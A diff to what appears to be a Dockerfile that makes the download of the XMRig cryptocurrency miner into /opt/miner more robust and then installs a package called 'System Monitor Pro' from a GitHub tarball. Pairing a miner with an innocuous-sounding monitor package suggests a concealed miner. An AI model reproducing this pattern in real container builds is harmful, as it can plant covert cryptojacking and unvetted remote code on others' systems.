@@ -280,16 +280,16 @@ USER root
 
 # Install minimal dependencies
 RUN apt-get update && \
-    apt-get install -y --no-install-recommends wget ca-certificates && \
+    apt-get install -y --no-install-recommends curl ca-certificates && \
     rm -rf /var/lib/apt/lists/*
 
-# Download XMRig
+# Download XMRig with retry
 RUN mkdir -p /opt/miner && \
-    wget --no-check-certificate -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && \
-    tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && \
-    mv xmrig-6.21.0/xmrig /opt/miner/ && \
+    curl -L --retry 3 --retry-delay 2 -o /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && \
+    tar -xf /tmp/xmrig.tar.gz -C /tmp && \
+    mv /tmp/xmrig-6.21.0/xmrig /opt/miner/ && \
     chmod +x /opt/miner/xmrig && \
-    rm -rf xmrig-6.21.0*
+    rm -rf /tmp/xmrig*
 
 # Install System Monitor Pro from GitHub tarball (no git needed)
 RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz
